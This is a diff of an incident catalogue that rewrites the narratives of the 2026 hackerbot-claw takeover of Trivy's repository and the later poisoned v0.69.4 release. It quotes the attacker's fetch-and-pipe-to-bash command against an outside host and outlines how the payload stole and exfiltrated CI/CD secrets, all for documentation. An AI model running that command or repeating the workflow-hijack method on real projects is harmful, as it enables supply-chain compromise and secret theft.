@@ -4,13 +4,31 @@
     The hackerbot-claw account exploited a pull_request_target workflow in aquasecurity/trivy
     to run untrusted fork code with repository privileges.
   story: |
-    The first Trivy incident was a GitHub Actions takeover, not a poisoned Trivy release. The `hackerbot-claw` account opened pull request 10254 with a harmless-looking branch name and triggered Trivy's API Diff Check workflow.
+    On February 28, 2026, an account calling itself `hackerbot-claw` opened
+    pull request 10254 against Aqua Security's Trivy repository, a widely used
+    open-source vulnerability scanner, and quietly took the project over within
+    hours. No Trivy binary was poisoned in this round. The damage was done
+    inside GitHub Actions.
 
-    The workflow used `pull_request_target`, then checked out the attacker's fork code and ran repository scripts with elevated permissions. The attacker modified `.github/actions/setup-go/action.yaml` so the normal Go setup step executed `curl -sSfL https://hackmoltrepeat.com/molt | bash`.
+    The opening was a classic Pwn Request. Trivy's API Diff Check workflow ran
+    on `pull_request_target`, the GitHub Actions trigger that gives a workflow
+    repository-write permissions while still checking out untrusted fork code.
+    The attacker modified `.github/actions/setup-go/action.yaml` in the fork so
+    that what looked like the normal Go setup step instead ran
+    `curl -sSfL https://hackmoltrepeat.com/molt | bash`. When Trivy's workflow
+    fired, the script ran with the repository's privileges and exfiltrated a
+    Personal Access Token.
 
-    That execution path stole a Personal Access Token. With the token, the attacker took over the repository, removed releases, pushed changes, and disrupted the public project. StepSecurity described Trivy as the most damaging repository compromise in the hackerbot-claw wave.
+    With that token, the attacker pushed to the official repository, deleted
+    releases, and defaced the project. StepSecurity, which catalogued the
+    broader hackerbot-claw spree against several open-source projects,
+    described Trivy as the most damaging compromise in the wave.
 
-    The later March 2026 Trivy v0.69.4 compromise is modeled separately because it used remaining credentials to publish malicious artifacts and move action tags. This record covers the February repository takeover that made the second incident possible.
+    Aqua restored Trivy at v0.69.2 and revoked what it could, but cleanup was
+    incomplete. Credentials surviving from the February takeover were used the
+    following month to publish malicious v0.69.4 artifacts and rewrite action
+    tags. That second incident is tracked separately at
+    [[trivy-second-compromise]].
   start_date: 2026-02-28
   end_date: 2026-03-01
   target:
@@ -79,13 +97,33 @@
     used to publish malicious Trivy v0.69.4 artifacts, force-push most trivy-action version
     tags, and replace setup-trivy tags with credential-stealing commits.
   story: |
-    The second Trivy compromise was a containment failure with a long tail. After the February takeover, attackers still had usable access. On March 19, 2026, they used compromised credentials to publish Trivy v0.69.4 artifacts and to change action tags that existing CI/CD workflows already trusted.
+    On March 19, 2026, attackers who still held credentials from the February
+    takeover of Aqua Security's Trivy repository used them to publish a
+    malicious Trivy v0.69.4 release and to rewrite the tags of two companion
+    GitHub Actions, `trivy-action` and `setup-trivy`, that thousands of CI/CD
+    pipelines already trusted by name. Docker Hub images for 0.69.4, 0.69.5,
+    and 0.69.6 followed days later.
 
-    The delivery path was not one file. It included the Trivy release, `trivy-action`, `setup-trivy`, and later Docker Hub images for 0.69.4, 0.69.5, and 0.69.6. Many workflows referenced mutable action tags instead of pinned commits, so force-pushed tags changed code under stable-looking configuration.
+    The delivery worked because most consumers pinned by mutable tag rather
+    than full commit SHA. Force-pushed tags swapped the underlying code without
+    changing the workflow files that referenced them. StepSecurity, which
+    documented the second wave, said the compromised setup-trivy commit
+    `8afa9b9` was itself benign but pointed workflows at the poisoned v0.69.4
+    binary.
 
-    The payload read GitHub Actions runner memory and process environments, collected developer and cloud secrets, encrypted the archive, and tried to exfiltrate it to `scan.aquasecurtiy.org` or fallback public repositories. Trivy was valuable to the attacker because it already ran where secrets live: inside build and deployment pipelines.
+    The payload read GitHub Actions runner memory and per-process environments,
+    collected developer and cloud secrets, encrypted the archive, and tried to
+    exfiltrate it to `scan.aquasecurtiy.org`, a typosquat of Aqua's own domain,
+    with public GitHub repositories as a fallback drop. Trivy was an unusually
+    rich target because it already ran inside build and deployment pipelines,
+    where secrets live in plaintext.
 
-    The Register reported Mandiant's estimate of more than 1,000 impacted SaaS environments, with researchers warning that the number could grow. Aqua removed affected tags, released fixed action versions, and published GHSA-69fq-xp46-6x23. The incident then bled into adjacent tools, including LiteLLM, through secrets stolen from CI/CD.
+    The Register, citing Mandiant, reported that more than 1,000 SaaS
+    environments were affected, with researchers warning the number was likely
+    to grow. Aqua removed the malicious tags, published clean releases, and
+    issued advisory GHSA-69fq-xp46-6x23. Stolen CI/CD secrets later bled into
+    adjacent projects, including LiteLLM, extending the blast radius beyond
+    Trivy itself.
   start_date: 2026-03-19
   end_date: 2026-03-23
   target:
